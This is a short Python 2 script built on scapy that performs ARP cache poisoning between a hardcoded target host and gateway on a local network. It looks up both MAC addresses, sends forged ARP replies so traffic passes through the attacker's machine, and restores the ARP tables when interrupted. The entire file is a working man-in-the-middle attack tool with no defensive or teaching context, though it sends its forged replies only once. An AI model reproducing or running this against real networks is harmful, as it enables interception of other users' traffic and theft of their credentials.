from scapy.all import *

def getmac(targetip):
    arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
    return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print "ARP Table restored to normal for", targetip

def main():
    targetip = "192.168.1.20"
    sourceip = "192.168.1.10"

    try:
        targetmac= getmac(targetip)
        print "Target MAC", targetmac
    except:
        print "Target machine did not respond to ARP broadcast"
        quit()
    try:
        sourcemac= getmac(sourceip)
        print "Gateway MAC:", sourcemac
    except:
        print "Gateway is unreachable"
        quit()
    print "Sending spoofed ARP responses"
    spoofarpcache(targetip, targetmac, sourceip)
    spoofarpcache(sourceip, sourcemac, targetip)

    while True:
        try:
            pass
        except KeyboardInterrupt:
            print "ARP spoofing stopped"
            restorearp(sourceip, sourcemac, targetip, targetmac)
            restorearp(targetip, targetmac, sourceip, sourcemac)
            quit()

if __name__=="__main__":
	main()